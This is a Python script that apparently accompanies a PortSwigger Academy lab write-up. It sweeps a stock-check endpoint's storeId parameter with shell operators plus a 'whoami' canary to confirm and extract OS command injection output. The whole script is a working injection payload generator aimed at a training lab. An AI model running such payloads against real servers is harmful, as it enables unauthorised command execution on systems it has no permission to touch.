#!/usr/bin/env python3
"""
OS command injection, simple case
PortSwigger Web Security Academy -- OS Command Injection

Companion script for the writeup: 01-simple-case.md

What this does:
    Sweeps the storeId parameter of the stock-check endpoint with the same fixed
    list of shell metacharacter operators our detector always tries, in the same
    order (";", "|", "||", "&", "&&", newline, backtick, subshell), appending a
    whoami canary after each and comparing response length against a clean
    baseline. The semicolon is first in that list and is the one that lands here,
    even though the pipe operator PortSwigger's own solution uses is equally
    injectable -- both work, the fixed search order just finds semicolon first.
    Once an operator changes the response shape, the script diffs the new
    response against the baseline to isolate the injected command's output.

Usage:
    python 01-simple-case.py <lab-url>
    e.g. python 01-simple-case.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import sys
import httpx

OPERATORS = [";", "|", "||", "&", "&&", "\n", "`{CMD}`", "$({CMD})"]


def build_payload(operator: str, command: str, prefix: str) -> str:
    """Same construction our detector uses -- verified payloads for this lab
    (storeId=1|whoami, storeId=1;whoami) concatenate directly with no space."""
    if operator == "`{CMD}`":
        return f"{prefix}`{command}`"
    if operator == "$({CMD})":
        return f"{prefix}$({command})"
    return f"{prefix}{operator}{command}"


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    target_url = f"{lab_url}/product/stock"
    base_data = {"productId": "1", "storeId": "1"}

    baseline = client.post(target_url, data=base_data)
    baseline_len = len(baseline.text)
    print(f"[*] Baseline response length: {baseline_len} bytes")

    injected_operator = None
    result_resp = None
    for op in OPERATORS:
        payload = build_payload(op, "whoami", base_data["storeId"])
        test_data = {**base_data, "storeId": payload}
        r = client.post(target_url, data=test_data)
        if r.status_code == 200 and len(r.text) != baseline_len:
            injected_operator = op
            result_resp = r
            print(f"[+] Injection confirmed with operator '{op}' -- response length "
                  f"changed from {baseline_len} to {len(r.text)} bytes")
            break
        print(f"[*] Operator '{op}': no change ({len(r.text)} bytes)")

    if not injected_operator:
        print("[-] No injectable operator found on storeId.")
        return

    output = (
        result_resp.text.replace(baseline.text, "").strip()
        if baseline.text in result_resp.text
        else result_resp.text
    )
    print(f"[+] Extracted whoami output: {output}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- inspect the response body above for the whoami output.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
